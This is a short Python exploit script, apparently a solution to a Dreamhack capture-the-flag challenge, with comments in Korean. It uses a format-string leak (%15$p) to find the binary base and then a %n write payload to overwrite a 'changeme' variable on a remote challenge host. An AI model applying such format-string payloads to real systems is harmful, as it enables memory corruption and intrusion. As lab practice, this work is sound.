from pwn import *

# p = process("./fsb_overwrite")
p = remote("host3.dreamhack.games", 8643)
elf = ELF("./fsb_overwrite")

payload = b"%15$p"  # [rsp + 0x48] 에 저장된 주소를 읽어오기 위함
p.send(payload)

binary_base = int(p.recvline()[:-1], 16) - 0x1293  # [rsp + 0x48]에서 읽어온 주소에서 해당 주소의 오프셋을 빼주어서 바이너리의 베이스 주소를 구함
# addr_changeme = binary_base + elf.symbols['changeme']
addr_changeme = binary_base + 0x401c  # 바이너리의 베이스 주소에서 changeme 변수의 오프셋을 더해줌

payload = b"%1337c%8$n".ljust(16)  # 6번째 인자가 [rsp]이므로, [rsp + 0x10] 은 8번째 인자
payload += p64(addr_changeme)

p.send(payload)
p.interactive()
